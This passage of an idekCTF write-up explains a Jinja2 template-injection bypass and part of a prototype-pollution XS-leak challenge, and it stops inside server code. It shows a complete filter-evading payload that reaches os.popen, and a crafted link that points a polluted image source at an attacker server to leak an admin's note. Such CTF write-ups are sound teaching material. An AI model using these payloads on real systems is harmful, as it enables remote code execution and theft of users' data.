&lt;h1 class=\"title\">You have entered the raffle!&lt;/h1>\n                 &lt;ul class=flashes>\n                    &lt;label>Hey {}! We have received your entry! Good luck!&lt;/label>\n                 &lt;/ul>\n                 &lt;/br>\n              &lt;/div>\n           &lt;/section>\n        &lt;/center>\n        {{% endblock %}}\n        '''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">elif</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">:</span>\n        page <span class=\"token operator\">=</span> \\\n            <span class=\"token triple-quoted-string string\">'''\n        {% extends \"layout.html\" %}\n        {% block body %}\n        &lt;center>\n            &lt;section class=\"section\">\n              &lt;div class=\"container\">\n                 &lt;h1 class=\"title\">Welcome to the idekCTF raffle!&lt;/h1>\n                 &lt;p>Enter your name below for a chance to win!&lt;/p>\n                 &lt;form action='/' method='POST' align='center'>\n                    &lt;p>&lt;input name='q' style='text-align: center;' type='text' placeholder='your name' />&lt;/p>\n                    &lt;p>&lt;input value='Submit' style='text-align: center;' type='submit' />&lt;/p>\n                 &lt;/form>\n              &lt;/div>\n           &lt;/section>\n        &lt;/center>\n        {% endblock %}\n        '''</span>\n    <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>page<span class=\"token punctuation\">)</span>\n\n\napp<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>There are two things to note from the source: the blacklisted characters, and the length limit.</p>\n<p>A standard payload for exploiting jinja2 SSTI for RCE is <code class=\"language-text\">lipsum.__globals__.os.popen('cat flag').read()</code>. This payload is blocked as it contains both <code class=\"language-text\">.</code> and <code class=\"language-text\">'</code>. An alternative to using <code class=\"language-text\">.</code> to access attributes is using <code class=\"language-text\">[]</code>, as in <code class=\"language-text\">lipsum[\"__globals__\"]</code>, but how can we create a <code class=\"language-text\">__globals__</code> string without quotation marks or access to <code class=\"language-text\">request</code>, <code class=\"language-text\">self</code>, or <code class=\"language-text\">config</code>?</p>\n<p>Jinja2 has many useful <a href=\"https://tedboy.github.io/jinja2/templ14.html\">filters</a> and <a href=\"https://tedboy.github.io/jinja2/templ16.html\">functions</a> which can be used to modify data. The most useful for our purposes are the <code class=\"language-text\">dict</code> function, and <code class=\"language-text\">list</code> filter.</p>\n<p>Why are these useful? For the ability to create strings out of thin air. We can create a dict without using any strings: <code class=\"language-text\">{{dict(foo=bar)}}</code>. Then, we can convert the dict to a list: <code class=\"language-text\">{{dict(foo=bar)|list}}</code>.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 457px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.21518987341772%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwElEQVQY05WOQQvCMAyF/f//Zp522cGKh1WxKpXtqoPWpsOmCnadttN1gmc/SAjv5ZHMhj+JMcQYp3k2DANjW7reMMZoWVJa7vaHqqpXS7Igy1GktCgKQkhd15zzLJvneX7k/PkKY9haK4RQoLSGpmmklG3bSilOp7NSIITQGiZRg1YKLlICwPdyjLEb8VN7OOd914/4zrn+2fc+WQnnOu/97+0QgjFovpWaRWtviGiuV0S8328G0SYrrWAI4RN+AwaQFrC/WBHyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"list\"\n        title=\"list\"\n        src=\"/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png\"\n        srcset=\"/static/3dc3c26f6732954720a52ee55d5a1e35/c26ae/list.png 158w,\n/static/3dc3c26f6732954720a52ee55d5a1e35/6bdcf/list.png 315w,\n/static/3dc3c26f6732954720a52ee55d5a1e35/34f1d/list.png 457w\"\n        sizes=\"(max-width: 457px) 100vw, 457px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>We now have an array of the string <code class=\"language-text\">foo</code>. Next, we just need to access the first element of the array, and we have successfully created a string! How can we do this without access to [0-9]? In python, <code class=\"language-text\">False == 0</code>, and <code class=\"language-text\">True == 1</code>, so our final payload for creating a string is <code class=\"language-text\">{{(dict(foo=bar)|list)[False]}}</code>. Also to note, a similar (and shorter) method of accessing the first element is using the <code class=\"language-text\">|last</code> or <code class=\"language-text\">|first</code> filters: <code class=\"language-text\">{{dict(foo=bar)|list|last}}</code>.</p>\n<p>With this knowledge, we can begin crafting an equivalent payload to <code class=\"language-text\">{{lipsum.__globals__.os.popen('cat flag').read()</code>.</p>\n<p>However, there is one more hurdle: if we can’t to execute the command <code class=\"language-text\">cat flag</code>, we will need a space in our string. How can we get a space in our string if we’re unable to create a dictionary key with a space? More filters! One useful filter is <code class=\"language-text\">|center</code>. If we <code class=\"language-text\">|center</code> a string, it will add spaces around it. To create the string <code class=\"language-text\">cat flag</code>, we can use the following payload : <code class=\"language-text\">{{[(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join}}</code> (which also uses <code class=\"language-text\">|reverse</code> to bypass the <code class=\"language-text\">flag</code> blacklist).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 461px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.68354430379747%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1klEQVQY0z2N207DMBBE8/8fAry2hNBKqKlURUQoohItvxGvHa+9u4690PRyHkbzMKNTqaqI5Jy1FGbWO6WUnPM1hYWISymqykwAUBYqVf09/zRNczx+t2272Wy7rhuGYdfu35u3vv9cv9bDV79arQ+H7nw6vTw/1XX9sds7a6urhIhipDkl9J4XiJiIhDmEeJGLxBjnOTFzzjmEeDOnlAyYyftxHAFgNMZamCbnJmcMuAfWgrUAxoIlIlW9mXHBe++cCyEg4iWXgt4jYozxsUFEEfk//wE2eRa/ZeCNugAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"jinjail rce string\"\n        title=\"jinjail rce string\"\n        src=\"/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png\"\n        srcset=\"/static/4a35587ba1bbf442a5e8534e8a23615b/c26ae/jinjail-cat-flag.png 158w,\n/static/4a35587ba1bbf442a5e8534e8a23615b/6bdcf/jinjail-cat-flag.png 315w,\n/static/4a35587ba1bbf442a5e8534e8a23615b/f816d/jinjail-cat-flag.png 461w\"\n        sizes=\"(max-width: 461px) 100vw, 461px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>Putting it all together, we reach the following payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"jinja2\"><pre class=\"language-jinja2\"><code class=\"language-jinja2\"><span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{{</span><span class=\"token variable\">lipsum</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">__globals__</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">os</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">popen</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">cat</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token filter function\">center</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">galf</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token filter function\">reverse</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token filter function\">join</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token function\">dict</span><span class=\"token punctuation\">(</span><span class=\"token variable\">daer</span><span class=\"token operator\">=</span><span class=\"token variable\">x</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token filter function\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token operator\">|</span><span class=\"token filter function\">reverse</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token delimiter punctuation\">}}</span></span></code></pre></div>\n<p>Upon submission, we see the flag:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 506px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.78481012658228%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1ElEQVQY042LwU6DQBBA+f/vsQeM8UBiUdk20guJjQtl1guEmdm2uwN0uzWoB4++0zu8l8R4u17j7d+EEGL87RPv3WajiqJ43++zLFOqqKqqLMun9fptu1VK5Xm+25VpmrZgXl+eV6u7+4fHujksc4zRWqu1tpbrugaArusAwBjzaUzbQgvAzFp/4ICHpsFhAGMQaZnPZycizjlm9t4fTyfvvYhM0xRCuFzmeZ5FJIQwjuPiXuZp+mkSZibCvu8HxG+n44IlImstM+OATMR/IEQi8iJfuTYVZZ5GeOcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"jinjail flag\"\n        title=\"jinjail flag\"\n        src=\"/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png\"\n        srcset=\"/static/8cbc8445507766b01e8060f08d66e763/c26ae/jinjail-flag.png 158w,\n/static/8cbc8445507766b01e8060f08d66e763/6bdcf/jinjail-flag.png 315w,\n/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png 506w\"\n        sizes=\"(max-width: 506px) 100vw, 506px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<hr>\n<h1 id=\"fancy-notes\" style=\"position:relative;\"><a href=\"#fancy-notes\" aria-label=\"fancy notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fancy notes</h1>\n<p>This challenge involved client-side prototype pollution + http parameter pollution to achieve XS leaks.</p>\n<p>The website is your typical note storing application. The main detail to note is <code class=\"language-text\">/report</code>, which can be used to send a link to an admin bot to view, meaning the challenge will involve some sort of client side vulnerability. The flag is stored in the admin’s note (as shown by reading the source code). The player can conclude that the goal is leaking the contents of the admin’s note.</p>\n<p>After registering and uploading a note, it can be stylized at <code class=\"language-text\">/fancy</code>.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 487px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQoz6WS3U6EMBCFef/H0iKY4IVhMaKYuGgrpTOdsNyU/q1hN2yUkKhxbjo56TdnetLk+I9KzkcIgYgE50KIcRw1akAcDwcA4JwTUdvupZREhIjTZL/BkzFlWbLrK8bSXfWQpizPb9/afZblWXZTFHdVtWOMFUVxX5aT/QLHGJ1zxxgvW8RTHxdl7hYlhOCXCzPsnFNKISIRaa2l7KWUXScBQQjRK6UUyE4CgNZ6GAbU2p7Mk1UGMUZrnbVuMtMMARpjzkpc/NeBrfjgPQK884+uk33fXx6ynfbmiLp+eW5eN7EfYO/9Y9081Y334c/wbz7JJ5N+QltJS7TUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"/fancy\"\n        title=\"/fancy\"\n        src=\"/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png\"\n        srcset=\"/static/003ec0571b85b62af50496ff999c6fa6/c26ae/fancy-get.png 158w,\n/static/003ec0571b85b62af50496ff999c6fa6/6bdcf/fancy-get.png 315w,\n/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png 487w\"\n        sizes=\"(max-width: 487px) 100vw, 487px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>Entering a note’s name <em>or content</em> will display the note with some fancy styling. Note how the query is passed via GET parameter, and the note can be searched via the content itself rather than just the title. These factors should strongly indicate XS leaks. So, we can make an admin access their note by sending a link with parts of the flag as the get parameter, but how can we determine whether or not the page displays the note?</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/16d513157456cd7a6dbbafa277508d6c/d2f5c/fancy-note.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.0253164556962%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABtUlEQVQoz42PwUtUQRyA36VbF/8RkRIjxEPRQaQ6iHhRt3NR0EUMlaUiOnTtUqSgrvug1dWlR+z6dt7MvOeub2feW3ffblqBIMJW0sXw4sbOzE+eCau5WsN3mvm++c1oxF7F1EGYIkxNREIsspQyZubiemIxpr+fjenJlGEikl5BGdPKmNZKFmPqEHtVAwUhZ5as1+Xevtrbl/XfLY6PKk2wiqBc2N4pMA9JILGABCoIzP4WKBduoAGrAOZAvSa2B+m8iqVlwpRJpOIZSOfDzZMO4dA6pr4kTDlFWNsIcUqKsP+NJXaBfaktJz88u5d6HtlejgPfFJb7jzickK9uzU/Njfa/eXTrwW1tsvfSRu9gdqT/s/4Wcp9C4fzJ/OgKfzF6Z2xAezJ4eeJuW6mnMxiNHBAXqP9HuODZXNEAyi9qxnX27qo7fWXbuAZBVNFys7wglmQdgvFd0r1j3NhJ3dw1e6A8JnGx1Z95FYgHtn+M4ym8/iv6+Ov9rtzrdk9vLz/t+DEcUdgDx29q1INCRWuslRpZt2EVmhD2beBhsauvOjtU+zjyPfby56sZQdgpB7mNXPEQyIY8jeoLzrcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"a fancy note\"\n        title=\"a fancy note\"\n        src=\"/static/16d513157456cd7a6dbbafa277508d6c/f058b/fancy-note.png\"\n        srcset=\"/static/16d513157456cd7a6dbbafa277508d6c/c26ae/fancy-note.png 158w,\n/static/16d513157456cd7a6dbbafa277508d6c/6bdcf/fancy-note.png 315w,\n/static/16d513157456cd7a6dbbafa277508d6c/f058b/fancy-note.png 630w,\n/static/16d513157456cd7a6dbbafa277508d6c/40601/fancy-note.png 945w,\n/static/16d513157456cd7a6dbbafa277508d6c/78612/fancy-note.png 1260w,\n/static/16d513157456cd7a6dbbafa277508d6c/d2f5c/fancy-note.png 1363w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>The stylization of the note is handled by client-side javascript:</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">fancify</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">note</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcolor <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>style <span class=\"token operator\">||</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\timage <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>image <span class=\"token operator\">||</span> <span class=\"token string\">'/static/images/success.png'</span><span class=\"token punctuation\">;</span>\n\tstyleElement <span class=\"token operator\">=</span> note<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\tstyleElement<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> style<span class=\"token punctuation\">;</span>\n\tnote<span class=\"token punctuation\">.</span>className <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">animation</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>color<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n\timg <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Image</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\timg<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> image\n\tnote<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\nargs <span class=\"token operator\">=</span> Arg<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nnoteElement <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'note'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>noteElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">fancify</span><span class=\"token punctuation\">(</span>noteElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p>The GET parameters are parsed with <code class=\"language-text\">Arg.parse(location.search)</code>. What is <code class=\"language-text\">Arg</code>? Arg.js is a javascript library for parsing arguments. This library is vulnerable to prototype pollution.</p>\n<p>Furthermore, we see that <code class=\"language-text\">fancify(note)</code> sets the image src to <code class=\"language-text\">/static/images/success.png</code> if <code class=\"language-text\">this.image</code> does not exist. Using prototype pollution, we can set <code class=\"language-text\">this.image</code> to anything we want! If we craft a link which will pollute <code class=\"language-text\">this.image</code> to point to our attacker controlled server, and supply a query of <code class=\"language-text\">idek{a</code> and send it to the bot, we can detect if the flag contains <code class=\"language-text\">idek{a</code>!</p>\n<p>We can repeat this process for each character until we leak the entire flag.</p>\n<p>However, the challenge is not over here. If we attempt to supply the link: <code class=\"language-text\">http://localhost:1337/fancy?q=idek{t&amp;style=1&amp;__proto__[image]=http://&lt;attacker-server></code>, we receive an error message from the server.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 476px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.59493670886076%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWUlEQVQoz5WS0W7bMAxF8///tKV92brAGdpm9Qc0tkVJNE3FTmeJslQ4cZsiQIDtvPGCF5QuucofpJxTSvkG0zQtbV96VjlnEfm9Lb59nynLcrPZFEWx2z0/Pj79+Plwf3f38me3Xq8ffs36S1mKxIs5pdS2uK/2WmtjTFVVAMDMRASgAZRzziKC1vV+Tx1fJosEozV1PPQ9M3ddNwyDc46ZHXM/zGJL5E7l8Xicy5bOj1/FKABgjFVNg4jWWj0DdV03TWOMUaqBswRgrQWtFcAyOU6T9z4EH0QkBO/HEMLofTzhvZeTPo5jjFMUiTGKyDm/lfceEXl+5YGZ9fxJXdeNNVYp1SgABdZYrcEdDkR06HsiCiJLYJdtpRTjFHxokRBbIrIWEVuR+JnwV5a0rzbsHCtYeHv7m69PIF3MV5z7lNLb7fMwHPPt47lpfn2ttsUTYvd/5n/nHVc8r0DAqE5KAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"param error\"\n        title=\"param error\"\n        src=\"/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png\"\n        srcset=\"/static/a3ce2c71b2c6b1a290cf63298f8ec379/c26ae/fancy-param-error.png 158w,\n/static/a3ce2c71b2c6b1a290cf63298f8ec379/6bdcf/fancy-param-error.png 315w,\n/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png 476w\"\n        sizes=\"(max-width: 476px) 100vw, 476px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>If we check the source code, we see that the server only expects the value of parameters which are not <code class=\"language-text\">q</code> to be 1 character long.</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/fancy'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">fancify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> session<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'q'</span> <span class=\"token keyword\">in</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">def</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token keyword\">and</span> k <span class=\"token operator\">!=</span> <span class=\"token string\">'q'</span> <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            results <span class=\"token operator\">=</span> find_note<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> results<span class=\"token punctuation\">:</span>\n                message <span class=\"token operator\">=</span> <span class=\"token string\">'here is your 𝒻𝒶𝓃𝒸𝓎 note!'</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                message <span class=\"token operator\">=</span> <span class=\"token string\">'no notes found!'</span>\n            <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'fancy.html'</span><span class=\"token punctuation\">,</span> note<span class=\"token operator\">=</span>results<span class=\"token punctuation\">,</span> message<span class=\"token operator\">=</span>message<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'fancy.html'</span><span class=\"token punctuation\">,</span> message<span class=\"token operator\">=</span><span class=\"token string\">'bad format! Your style params should not be so long!'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span 